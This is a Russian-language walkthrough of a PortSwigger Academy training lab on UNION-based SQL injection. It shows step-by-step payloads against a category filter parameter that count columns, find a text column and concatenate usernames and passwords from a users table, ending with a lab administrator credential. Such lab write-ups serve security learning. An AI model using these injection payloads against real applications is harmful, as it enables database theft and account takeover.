Зайдем на страницу `Pets` и найдем в `Proxy` -> `HTTP history` необходимый нам запрос
```
GET /filter?category=Pets
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/6.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/pics%20for%20walktrough/1.png)

Аналогично методам из прошлых лабораторных работ определяем количество столбцов, которое содержится в нашей таблице. Методом перебора определяем, что их количество - 2
```
GET /filter?category=Pets'+UNION+SELECT+NULL,NULL--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/6.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/pics%20for%20walktrough/2.png)

Далее, нам необходимо определить какие из данных столбцов имеют текстовый формат, для коррекного вывода полей `username`, `password`, которые нам неоходимо вывести согласно заданию
Пробуем запрос

```
GET /filter?category=Pets'+UNION+SELECT+'a','a'--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/6.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/pics%20for%20walktrough/3.png)
И получаем ошибку

А вот при следующем запросе получаем успешный ответ

```
GET /filter?category=Pets'+UNION+SELECT+NULL,'a'--
```
Сответсвенно делаем вывод, что только второй столбец имеет текстовый формат данных
Далее, Объединим в одну колонку значения из другой таблицы, известной нам по заданию
```
GET /filter?category=Pets'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/6.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/pics%20for%20walktrough/4.png)

Получаем связку логин-пароль от УЗ 
`administrator:dbc9xiqpqdunhzahsa3x`
Введем их в поля для аутентификации пользователей, после чего и получим поздравление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/6.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/pics%20for%20walktrough/5.png)

